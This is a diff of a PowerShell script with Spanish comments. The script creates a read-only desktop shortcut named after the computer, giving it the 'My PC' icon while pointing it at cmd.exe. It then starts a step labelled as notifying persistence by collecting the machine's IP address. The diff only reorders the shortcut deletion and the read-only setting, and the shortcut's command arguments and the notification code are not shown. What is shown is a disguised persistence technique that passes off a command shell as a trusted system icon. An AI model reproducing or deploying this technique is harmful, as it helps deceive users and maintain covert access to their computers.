@@ -107,13 +107,18 @@ $iconIndex = 104 # El índice 15 de este archivo es el icono de "Mi PC"
 # Nombre del archivo del acceso directo
 $linkName = "$env:COMPUTERNAME.lnk"
 
+# Verificar si el acceso directo existe y eliminarlo si es necesario
+if (Test-Path "$desktopPath\$linkName") {
+    # Quitar atributo de solo lectura si existe
+    Set-ItemProperty "$desktopPath\$linkName" -Name IsReadOnly -Value $false
+    Remove-Item "$desktopPath\$linkName" -Force
+}
+
+
 # Crea el objeto de acceso directo y establece las propiedades
 $link = (New-Object -ComObject WScript.Shell).CreateShortcut("$desktopPath\$linkName")
 $link.IconLocation = "$iconPath,$iconIndex"
-# Establece la propiedad de solo lectura para el archivo del acceso directo
-$attribs = [System.IO.FileAttributes]::ReadOnly
-$linkFile = Get-Item "$desktopPath\$linkName"
-$linkFile.Attributes = $attribs
+
 $targetPath = "C:\Windows\System32\cmd.exe"
 $link.RelativePath = ""
 $link.TargetPath = $targetPath
@@ -147,6 +152,16 @@ $link.Arguments = "
 
 
 $link.Save()
+# Establece la propiedad de solo lectura para el archivo del acceso directo
+$attribs = [System.IO.FileAttributes]::ReadOnly
+if (Test-Path "$desktopPath\$linkName") {
+    $linkFile = Get-Item "$desktopPath\$linkName"
+    $linkFile.Attributes = $attribs
+} else {
+    Write-Error "No se pudo encontrar el archivo de acceso directo: $desktopPath\$linkName"
+}
+
+
 
 #Notificamos la persistencia
 # Obtener la dirección IP de la máquina actual
